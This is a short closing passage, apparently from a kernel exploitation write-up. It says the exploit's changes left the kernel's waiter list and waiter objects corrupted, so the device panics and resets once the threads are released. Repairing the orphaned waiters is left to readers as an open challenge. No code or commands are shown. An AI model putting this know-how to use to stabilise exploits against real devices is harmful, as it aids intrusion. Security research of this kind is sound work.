One last thing, there's just one open issue left, which should be somewhat challenging. You see, all the things we did wreaked havoc on the waiter list and the waiter objects, which leaves the kernel in a fragile state, where as soon as all the threads are released will cause the kernel to panic. In a real-life scenario this translates to a device (soft) reset. It would be interesting to try to locate all the orphaned waiters and mend the waiter list. I'll leave this as an open challenge to you readers
